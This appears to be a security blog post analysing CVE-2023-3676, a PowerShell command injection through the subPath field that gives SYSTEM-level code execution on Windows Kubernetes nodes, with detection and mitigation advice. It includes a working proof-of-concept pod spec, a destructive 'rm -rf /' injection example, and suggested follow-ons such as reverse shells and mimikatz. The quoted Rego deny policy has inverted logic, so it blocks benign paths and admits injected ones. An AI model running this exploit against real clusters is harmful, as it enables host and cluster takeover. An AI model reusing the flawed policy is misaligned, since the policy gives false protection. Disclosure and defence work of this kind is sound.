@@ -1,0 +1,159 @@
+
+On August 23, 2023, CVE-2023-3676 in the Kubernetes project was publicly disclosed. This vulnerability allows a user who can create pods on Windows nodes to execute Powershell commands at the privilege level of the Kubelet on those nodes (generally the highest privileges available locally). Kubernetes clusters are only affected if they include Windows worker nodes running the vulnerable version of the Kubelet.
+The vulnerability is trivial to exploit given the preconditions, as we will demonstrate below. A fixed version of the Kubelet has been released and managed Kubernetes services are already being patched by AWS, Google, Microsoft, and other cloud service providers. If you self-manage clusters, you should evaluate your threat model with ease of exploitation in mind and strongly consider upgrading your Kubelet to the already available patched versions.
+Affected Versions
+kubelet <= v1.28.0
+kubelet <= v1.27.4
+kubelet <= v1.26.7
+kubelet <= v1.25.12
+kubelet <= v1.24.16
+Vulnerability overview
+This vulnerability is ultimately a classic command injection vulnerability. Triggering it involves understanding data sources and sinks in Kubernetes during the pod creation lifecycle, but it is relatively simple.
+Command injection
+If you're well acquainted with the command injection bug class, feel free to skip down to the actual exploit. This attack has the goal of executing arbitrary commands on a host system by exploiting input from an external source.
+
+Here's an example of PHP code that is vulnerable to command injection:
+$ip = $_GET['ip'];
+    system("ping -c 4 " . $ip);
+This code is vulnerable because it directly uses user input ($_GET['ip']) in a system command without any form of sanitization or validation. An attacker could easily manipulate the ip parameter in the GET request to execute arbitrary commands. For instance, if an attacker passes 127.0.0.1; rm -rf /, the system would execute ping -c 4 127.0.0.1; rm -rf /, which would delete all files in the root directory.
+
+Needless to say, including untrusted user input directly in commands is hazardous. Further detailed reading and examples for curious readers can be found at CWE-77.
+Command injection via Kubelet Windows worker nodes
+The published vulnerability exists in the code path of the volumeMounts.subPath property. This property is intended to allow volume sharing across multiple containers within a single pod. During the process of creating and mounting volumes on Windows nodes, the Kubelet passes the unsanitized contents of the subpath property to Powershell to check for and resolve symlinks (with some transformations and alterations). (Incidentally, Powershell is only used here because of a bug in Golang on Windows).
+Normally, validation passes or fails and the volume will be mounted at a named subpath. However, as we saw above, trusting unsanitized user input to system commands is quite dangerous. The vulnerable code shown below will directly pass user input to a Powershell command in the path variable:
+cmd := fmt.Sprintf("(Get-Item -LiteralPath %q).LinkType", path)
+output, err := exec.Command("powershell", "/c", cmd).CombinedOutput()
+To exploit this vulnerability, we crafted a pod spec like so:
+apiVersion: v1
+kind: Pod
+metadata:
+  name: bad-winshell
+spec:
+  containers:
+  - name: shell
+    image: mcr.microsoft.com/powershell
+    command: ["pwsh"]
+    args: ["-Command", "Start-Sleep", "3600"]
+    volumeMounts:
+    - mountPath: /var/lib/mysql
+      name: site-data
+      subPath: $([System.Security.Principal.WindowsIdentity]::GetCurrent()>c:/POC) # Command injection here
+  nodeSelector:
+    "kubernetes.io/os": windows
+  volumes:
+  - name: site-data
+A simple kubectl apply -f badpod.yml will task the spec to the Kubelet. During the attempt to mount the evil pod, the Kubelet shells out and attempts to check for symlinks, with the resulting command containing our injected Powershell code.
+We (the creators of the evil pod) control the contents of the path variable injected into %q, which results in the following command being executed by Powershell:
+(Get-Item -LiteralPath $([System.Security.Principal.WindowsIdentity]::GetCurrent()>c:/POC)).LinkType
+This is parsed by the interpreter that creates a subshell and executes our command, writing the identity of the current principal (the Linux equivalent would be something like id) into the c:/POC file. This command is executed by the Kubelet in the context of the actual host system, not the container, so full access to bad stuff as NT AUTHORITY\SYSTEM is available. The exploit above doesn't even result in the successful creation of a pod—who needs a container when you've got full system privileges 😈. This vulnerability allows for the full gamut of host exploitation techniques, all with full system privileges: opening a reverse shell, pulling mimikatz, etc. And in the context of a Kubernetes cluster, consider that it would be simple to escalate from the node to the full cluster—installing a daemonset to mine crypto, accessing sensitive data used in workloads, or even encrypting the etcd server or escalating beyond the worker node using IAM tokens. Demonstrations of these will be left as an exercise to the reader.
+
+Journey of a POC
+The initial discoverer of the vulnerability, Tomer Peled from Akimai, has released a POC and writeup of the research. My research was done independently of that publication, and although another POC is now available, I thought it would still be valuable to give a little context around the work that went into exploit development on our side.
+
+As background, I am not an expert on Windows by any means and the exploitation here isn’t some mind blowing ROP chain or anything especially fancy. The value in developing a POC for me is in learning the systems at play and how they interact. I’ve learned a good deal about the general discipline and process of exploit development from generous members of the security community, especially Stephen Sims and Chompie. I make it a habit of reading the diffs in open source projects when CVEs are released, trying to understand how and what is being done to mitigate vulnerabilities. This can sometimes be fruitful because fixes can be incomplete but is mostly just an excellent means of learning about patterns of vulnerabilities.
+For this CVE, I had some context on Powershell and a decent amount of experience writing and reading Go code in addition to cursory familiarity with Kubernetes itself. Of course, being able to read the actual source code is incredibly useful (reverse engineering or binary diffing isn’t necessary) and allows tracing data flows through the code. There are surely more sophisticated techniques than just reading code, but I’m a simple man! So given a diff, we can tell what the code used to look like and thus what the vulnerability was. And that allows us to ask the question, “How can I get data here?”
+Once we have the data sink, we work backwards from every caller of the vulnerable function and trace data back along its path ultimately trying to find its source. In the case of this bug, the code path was:
+VolumeMount.subPath [PATH] (this is where the injection would have to go) -> makeMounts -> subpather.SafeMakeDir -> doSafeMkDir (calls evalSymlink with the subpath to check if its a symlink) -> evalSymlink -> calls out to Powershell with isLinkPath [PATH]
+There are some intricacies with how the path passed to isLinkPath is constructed and examined, but ultimately they didn’t matter too much.
+Once I had a good idea of where to put data, it was a matter of establishing intentionally vulnerable infrastructure. Surprisingly, this was a bit harder than you might think (that’s a good thing!) Originally we were running a managed Kubernetes cluster with Windows worker nodes and an AWS-supplied AMI. Based on the vulnerability versions released by the Kubernetes PR, our cluster was vulnerable (kubelet <= v1.26.7).
+❯ kubectl get nodes
+NAME                             STATUS   ROLES    AGE    VERSION
+ip-192-168-103-50.ec2.internal   Ready    <none>   2d3h   v1.26.7-eks-8ccc7ba
+However, after a couple days of spamming testing various escaped Powershell commands with no results, I decided to examine Powershell logs and discovered that I was using a fixed version of the Kubelet! It turned out that EKS-managed clusters use an AWS-supplied patched Kubelet on their AMI even though it was technically vulnerable according to the versions listed by the Kubernetes project, so I had to create an intentionally vulnerable cluster on my own. This involved searching through Amazon-supplied images using aws ssm get-parameters-by-path and cluster creation using eksctl. The most important lesson here was in verifying the actual setup of your work. It’s not always readily apparent whether your system is vulnerable if you haven’t figured out how to actually perform the exploit, but some good time invested upfront in thinking about how to make certain of this would have saved me lots of time.
+Once I actually had a vulnerable system, it was a quick exercise to actually perform the exploit.
+Detection/mitigation opportunities
+Mitigation of the vulnerability is of course best accomplished through patching. Barring that, cluster admins can utilize tools like OPA/Gatekeeper, the new Kubernetes Validating Admission Policy, or Kyverno. Tommy McCormick (ex-Datadog) spoke at BSides Zurich 2022 on admission controllers and how we use them at Datadog. Policies to deny the creation of pods with subPaths or with suspicious-looking commands in the subPath field would all be possible strategies—although the latter strategy is possibly fraught, as the huge variety of possible injection methods would be nigh impossible to cover systematically. It might be better to only allow subPaths that do not contain any special shell characters; this will need to be evaluated based on your local workloads. Tomer Peled, the Akimai researcher who discovered this vulnerability, supplied the following policy for the general case:
+package kubernetes.admission
+
+  deny[msg] {                                                                 
+    input.request.kind.kind == "Pod"
+    path := input.request.object.spec.containers.volumeMounts.subPath                 
+    not startswith(path, "$(")                                     
+    msg := sprintf("malicious path: %v was found", [path])     
+}
+Detection opportunities for this exploitation will come primarily from logs, both of various cluster components and Powershell script block logging (which has to be enabled) along with other sorts of process monitoring on the worker nodes. Detection rulesets, like Sigma’s open source suite of Powershell detections, provide a comprehensive (albeit generic) set of signatures of malicious activity and could be utilized to get you started.
+Tuning your direction to your specific workloads is important, and one place to start detecting exploitation would be deviations from your baseline. In the context of normal cluster operations, the Kubelet will be executing a limited number of Powershell commands with a finite set of arguments. Deviations from that baseline should cause suspicion. For example, in the following logs, we see the usual invocation is for Get-Item and then we see that our malicious code causes a deviation from that with Out-File, along with some never before seen parameter bindings—all running within the context of a Get-Item call (i.e., a subprocess).
+PS C:\Windows\system32> Get-WinEvent -FilterHashtable @{logname = "Microsoft-Windows-PowerShell/Operational"; id = 4104 } -MaxEvents 20
+| select -ExpandProperty message
+
+Context:
+Severity = Informational
+Host Name = ConsoleHost
+Host Version = 5.1.20348.1850
+Host ID = 5f175c20-15dc-40c6-bfdc-700fc8336b38
+Host Application = powershell /c (Get-Item -LiteralPath "c:\\var\\lib\\kubelet\\pods\\5d94d2d0-5078-480f-ac9b-dadaa46500e9\\vol
+umes\\kubernetes.io~empty-dir\\site-data").LinkType
+Engine Version = 5.1.20348.1850
+Runspace ID = 295b32dd-6606-481e-a660-e3a897127c55
+Pipeline ID = 1
+Command Name =
+Command Type = Script
+Script Name =
+Command Path =
+Sequence Number = 18
+User = WORKGROUP\SYSTEM
+Connected User =
+Shell ID = Microsoft.PowerShell
+
+
+User Data:
+
+
+CommandInvocation(Get-Item): "Get-Item"
+ParameterBinding(Get-Item): name="LiteralPath"; value="c:\\var\\lib\\kubelet\\pods\\5d94d2d0-5078-480f-ac9b-dadaa46500e9\\volumes\\kube
+rnetes.io~empty-dir\\site-data"
+
+Context:
+Severity = Informational
+Host Name = ConsoleHost
+Host Version = 5.1.20348.1850
+Host ID = bbd06d3c-c01c-4578-a04d-385181bf91ed
+Host Application = powershell /c (Get-Item -LiteralPath "c:\\var\\lib\\kubelet\\pods\\5d94d2d0-5078-480f-ac9b-dadaa46500e9\\vol
+umes\\kubernetes.io~empty-dir\\site-data\\$([System.Security.Principal.WindowsIdentity]::GetCurrent()>c:\\POC)").LinkType
+Engine Version = 5.1.20348.1850
+Runspace ID = a3db6fed-7df0-4e3e-9824-63e57bfc8890
+Pipeline ID = 1
+Command Name = Get-Item
+Command Type = Cmdlet
+Script Name =
+Command Path =
+Sequence Number = 18
+User = WORKGROUP\SYSTEM
+Connected User =
+Shell ID = Microsoft.PowerShell
+
+
+User Data:
+
+
+CommandInvocation(Out-File): "Out-File"
+ParameterBinding(Out-File): name="FilePath"; value="c:\\POC"
+ParameterBinding(Out-File): name="InputObject"; value="System.Security.Principal.WindowsIdentity"
+Prevalence of fixed versions
+Based on our analysis of customer environments, we generated the following table that shows the breakdown of Kubelet versions, classified by whether or not they are vulnerable to this CVE. From this, it's possible to see that quite a few clusters have still to be updated to address this issue.
+
+
+Conclusion
+CVE-2023-3676 is a perfect demonstration of two interesting phenomena in security:
+
+Vulnerabilities tend to perpetuate at the boundaries between systems
+Bugs often cause more bugs
+For the first case, a Go binary (the Kubelet) is calling out to a shell/command interpreter (Powershell) with user-supplied data. Crossing the process boundary with raw text means that the assumptions held about the Kubelet don’t necessarily apply to Powershell. As for the second case, the use of Powershell is only necessary due to the aforementioned bug in Golang itself. It’s a kludge, to be sure, to have to rely on Powershell for these sorts of trivial system administration tasks. Unfortunately this one had consequences.
+
+Beyond the technical details of the bug itself, I hope my description of the process of developing a POC provides inspiration for some of you out there to get your hands dirty messing around with bugs! It’s a wonderful way to learn about systems, and the process is much easier with open source software; you can read the diffs as code, rather than having to rely on binary diffing and reverse engineering. Now go forth and POC!
+$_GET['ip']
+ip
+127.0.0.1; rm -rf /
+ping -c 4 127.0.0.1; rm -rf /
+path
+kubectl apply -f badpod.yml
+%q
+id
+c:/POC
+NT AUTHORITY\SYSTEM
+isLinkPath
+aws ssm get-parameters-by-path
+eksctl
+Get-Item
+Out-File
+Get-Item
